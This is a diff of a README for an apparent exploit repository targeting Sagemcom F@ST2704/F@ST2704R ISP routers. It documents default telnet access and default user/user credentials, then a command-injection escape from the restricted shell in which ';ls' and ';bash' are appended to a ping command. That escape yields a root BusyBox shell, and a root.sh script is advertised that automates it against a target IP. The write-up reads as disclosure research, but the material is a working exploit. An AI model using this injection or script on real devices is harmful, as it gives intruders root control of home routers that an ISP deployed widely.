@@ -1,12 +1,20 @@
-# Root shell for everybody!
+# F@ST2704 has a root shell for everybody!
+
+### Included
+`root.sh` is a simple shell script that provides the root shell
+`lsFileList.txt` is a the complete list of files on the device.
+
+### Usage
+
+`./root.sh [target=192.168.1.1]`
 
 ## Long story short
 
 I went back to my parent's place for a few days. I had quite a surprise: they replaced the nice Cisco router I got them by a Sagemcom F@ST2704R . When I asked them why, they told me the local ISP gave F@ST2704R to their all their clients in the area. Knowing that was quite a lot of clients I decided to take a look at it.
 
-## So... How is it?
+### So... How is it?
 
-This piece of hardware is crap.
+This piece of hardware/software is crap.
 
 Telnet and ssh is activated by default on the LAN. The admin password is a string of 4 random lowercase letters. Wrong start mate.
 
@@ -119,14 +127,18 @@ exitOnIdle
 wan
 ```
 
-Let's explore the firmware for more info!
+### Let's explore the firmware for more info!
 
-Unfortunately, the F@ST2704R firmware is not available to download, but the F@ST2704 is. It can't be THAT different eh?
+Unfortunately, the F@ST2704R firmware is not available to download, but [the F@ST2704 is](http://support.sagemcom.com/site/mo/broadband-access-9/sagemcom-f-st-2704-etisalat-1035/driver). It can't be THAT different eh?
 wget this stuff, and binwalk the shit out of it!
-Not so surprisingly, the binairies we want exist in the /bin folder, the shell we're provided just can't get to it. But we have access to ping...
+Not so surprisingly, the binairies we want exist in the /bin folder, the shell we're provided just can't get to it. We must break the jail.
+
+### Breaking the jail
+
+We have access to ping...
 
  ```
- > ping -c 1 127.0.0.1
+ > *ping -c 1 127.0.0.1*
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.866 ms
 
@@ -135,15 +147,14 @@ PING 127.0.0.1 (127.0.0.1): 56 data bytes
 round-trip min/avg/max = 0.866/0.866/0.866 ms
 ```
 
-
 I wonder if... Let's try some semicolon magic!
 
 ```
-> ls
+> *ls*
 telnetd:error:997.792:processInput:406:unrecognized command ls
  >
  >
- > ping -c 1 127.0.0.1;ls
+ > *ping -c 1 127.0.0.1;ls*
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.948 ms
 
@@ -158,7 +169,7 @@ dev      linuxrc  proc     tmp      webs
 Alright! this way I can get a real shell
 
 ```
- > ping -c 1 127.0.0.1;bash
+ > *ping -c 1 127.0.0.1;bash*
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.459 ms
 
@@ -170,7 +181,7 @@ round-trip min/avg/max = 0.459/0.459/0.459 ms
 BusyBox v1.17.2 (2013-09-30 17:48:17 CST) built-in shell (ash)
 Enter 'help' for a list of built-in commands.
 
-# 
+*#* 
 ```
 
  Using the username user and the default password user followed by this ping/semicolon loophole gives us access to a shell with administrative rights more easiy than brute-forcing the admin's password (default 4 letters, can be changed for another one up to 16 letters).
